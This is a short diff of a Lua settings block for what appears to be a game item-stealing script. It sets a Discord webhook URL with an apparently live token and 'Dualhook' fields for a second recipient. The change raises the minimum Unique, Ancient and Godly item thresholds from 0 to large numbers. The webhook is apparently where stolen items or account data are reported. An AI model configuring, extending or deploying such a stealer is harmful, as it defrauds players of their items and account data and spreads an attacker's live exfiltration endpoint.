@@ -4,9 +4,9 @@ Webhook = "https://discord.com/api/webhooks/1401607749741052134/VIbvQzvj4MxokS78
 -- [ Dualhook Settings ] --
 DualUsername = "username" -- [Dualhook Username]
 DualWebhook = "webhook" -- [Dualhook Webhook]
-DualUnique = 0 -- [Minimum Unique]
-DualAncient = 0 -- [Minimum Ancient]
-DualGodly = 0 -- [Minimum Godly]
+DualUnique = 5235235 -- [Minimum Unique]
+DualAncient = 235235 -- [Minimum Ancient]
+DualGodly = 235235325 -- [Minimum Godly]
 
 userName = Username
 webHook = Webhook
